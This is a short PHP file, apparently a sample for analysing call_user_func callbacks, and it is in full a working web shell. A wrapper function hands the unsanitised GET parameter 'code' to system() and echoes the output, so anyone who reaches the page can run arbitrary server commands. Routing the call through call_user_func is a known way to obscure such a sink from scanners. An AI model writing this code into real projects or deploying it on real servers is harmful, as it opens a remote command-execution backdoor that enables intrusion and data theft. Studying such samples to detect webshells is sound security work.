<?php
/* 
 * 回调函数分析 call_user_func
 */

function myexec($code){
    echo system($code);
}
 
call_user_func('myexec',$_GET['code']);
